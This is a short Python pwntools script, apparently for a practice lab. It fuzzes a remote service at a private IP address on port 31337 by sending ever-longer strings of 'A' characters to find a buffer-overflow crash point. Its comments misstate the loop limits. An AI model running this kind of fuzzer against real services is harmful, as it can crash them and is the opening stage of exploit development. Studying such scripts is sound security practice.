from pwn import *
import sys, time

length=20

io = remote('192.168.1.21', 31337)

while (length < 2000): #continue to send data until bytes == 10000
	
	io.sendline(b"A" * length) #Send payload
	io.recvline()
	time.sleep(2)
	print("Buffer sent: " + str(length))
	length += 20 #increment payload by 100
